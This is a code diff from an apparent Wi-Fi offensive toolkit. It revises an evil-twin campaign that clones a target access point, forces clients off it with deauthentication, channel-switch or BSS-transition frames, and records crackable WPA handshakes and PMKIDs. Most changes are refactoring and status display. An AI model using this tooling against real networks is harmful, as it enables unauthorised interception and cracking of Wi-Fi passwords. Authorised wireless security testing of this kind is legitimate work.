@@ -5,13 +5,18 @@ from __future__ import annotations
 
 import asyncio
 import logging
+import os
 from dataclasses import dataclass
+from pathlib import Path
 from typing import Optional
 
 from wifit3.dot11 import str_to_mac
 from wifit3.dot11.ap import beacon_clone
 from wifit3.dot11.csa import build_csa_beacon
-from wifit3.crack.handshake import crackable_pairs, pmkid_crackable
+from wifit3.dot11.rsn import SAE_AKM_SUITES
+from wifit3.crack.handshake import PSK_CAPTURE_AKMS, crackable_captures
+from wifit3.dot11.pmf import PmfPosture
+from wifit3.models import AccessPoint
 from wifit3.campaigns.campaign import Campaign
 from wifit3.campaigns.eviltwin.fake_ap import FakeAP
 from wifit3.campaigns.eviltwin.punter import Punter, PuntMode, BURST_SIZE, FRAME_GAP_SEC
@@ -31,10 +36,9 @@ def csa_target_channel(ap_channel: int, preferred: Optional[int] = None) -> int:
     return 6 if ap_channel == 1 else 1
 
 
-def default_punt_modes(ap) -> tuple[PuntMode, ...]:
-    """Techniques checked by default for the target's PMF posture: PMF-Required blocks the
-    robust-frame punts (deauth + BTM), leaving CSA; otherwise all three."""
-    if ap.pmf_required:
+def default_punt_modes(ap: AccessPoint) -> tuple[PuntMode, ...]:
+    """CSA alone when PMF is required or invalid (robust-frame punts blocked); otherwise all three."""
+    if ap.pmf_posture in (PmfPosture.REQUIRED, PmfPosture.INVALID):
         return (PuntMode.CSA,)
     return (PuntMode.DEAUTH, PuntMode.CSA, PuntMode.BTM)
 
@@ -61,14 +65,34 @@ class EvilTwinCampaign(Campaign):
     run_variant = "error"
 
     @classmethod
-    def visible(cls, ap) -> bool:
+    def visible(cls, ap: AccessPoint) -> bool:
         return bool(ap.ssid) and bool(ap.akm_suites)
 
     @classmethod
-    def ineligible_reason(cls, ap) -> Optional[str]:
+    def ineligible_reason(cls, ap: AccessPoint) -> Optional[str]:
+        if not (PSK_CAPTURE_AKMS | SAE_AKM_SUITES) & set(ap.akm_suites):
+            return "Needs a PSK or SAE network"
+        if not ap.rsn_valid:
+            return "Needs a WPA2/WPA3 network"
         if not ap.last_beacon_frame:
             return "no beacon captured yet"
         return None
+
+    def status_under_card(self) -> str:
+        return "● EvilTwin"
+
+    def status_headlines(self, vault) -> list[str]:
+        from wifit3.persist.config import Config
+        if self.captured:
+            return ["[black bold on green] ✓ Captured [/black bold on green] crackable M2",
+                    f"[dim]saved to {Path(Config.captures_dir)}{os.sep}[/dim]"]
+        stats = getattr(self.fakeap, "stats", None)
+        if stats is None:
+            return [f"[bold cyan]EvilTwin arming…[/bold cyan] on CH {self.twin_channel}"]
+        return [f"[bold cyan]EvilTwin active[/bold cyan] on CH {self.twin_channel}",
+                f"[dim]auth:{stats.auth} · assoc:{stats.assoc} · M2:{stats.m2}[/dim]",
+                f"[dim]probes: {stats.probes_direct} direct · "
+                f"{stats.probes_wildcard} wildcard[/dim]"]
 
     def __init__(self, array, target, evil_input: EvilTwinInput):
         if not target.last_beacon_frame:
@@ -91,6 +115,7 @@ class EvilTwinCampaign(Campaign):
         self.punter = self._make_punter(evil_input, target.bssid)
         self.fakeap: Optional[FakeAP] = None
         self.captured = False
+        self.captures_before_start: set[tuple[str, str, bytes]] = set()
 
     def _make_punter(self, evil_input: EvilTwinInput, target_bssid: str) -> Optional[Punter]:
         if not evil_input.punt_modes:
@@ -100,6 +125,7 @@ class EvilTwinCampaign(Campaign):
                       str_to_mac(self.twin_bssid), self.twin_channel, self.target_channel)
 
     async def _loop(self) -> None:
+        self.captures_before_start = self._crackable_captures()
         self.fakeap = FakeAP(self.twin_iface, str_to_mac(self.twin_bssid), self.ssid,
                              self.twin_channel, self.twin_beacon, rx_source=self.twin_iface,
                              record_m1=self.array.record_injected_eapol)
@@ -107,6 +133,7 @@ class EvilTwinCampaign(Campaign):
             self.array.ignore_stray_beacons(self.twin_bssid, self.twin_channel)
         else:
             self.array.mark_evil_twin(self.twin_bssid)
+            self.array.record_injected_beacon(self.twin_beacon, self.twin_iface.name, self.twin_channel)
         await self.fakeap.start()
         if (self.punt_iface is not self.twin_iface
                 and self.punt_iface.current_channel != self.target_channel):
@@ -141,20 +168,26 @@ class EvilTwinCampaign(Campaign):
             elapsed += _POLL_SEC
 
     def _has_crackable_capture(self) -> bool:
-        # Twin BSSID holds our forged M2; the target BSSID holds any real 4-way / PMKID after a punt.
+        return bool(self._crackable_captures() - self.captures_before_start)
+
+    def _crackable_captures(self) -> set[tuple[str, str, bytes]]:
+        """(bssid, client, ANonce or PMKID) per crackable capture. Twin BSSID holds our forged M2;
+        the target BSSID holds any real 4-way / PMKID after a punt."""
+        captures = set()
         for bssid in {self.twin_bssid, self.ap.bssid.lower()}:
             ap = self.array.access_points.get(bssid)
-            if ap and any(crackable_pairs(hs) or (hs.pmkid and pmkid_crackable(hs))
-                          for hs in ap.handshakes.values()):
-                return True
-        return False
+            if ap is not None:
+                captures |= {(bssid, client, key) for client, key in crackable_captures(ap)}
+        return captures
 
     async def teardown(self) -> None:
         if self.fakeap is None:
             return
         try:
-            await self.fakeap.stop()      # stop the WPA2 beacon + responder first
-            await self._csa_return()      # then announce the switch-back, uninterleaved
+            try:
+                await self.fakeap.stop()  # stop the WPA2 beacon + responder first
+            finally:
+                await self._csa_return()  # then announce the switch-back, uninterleaved
         finally:
             if self.same_bssid:
                 self.array.stop_ignoring_stray_beacons(self.twin_bssid)
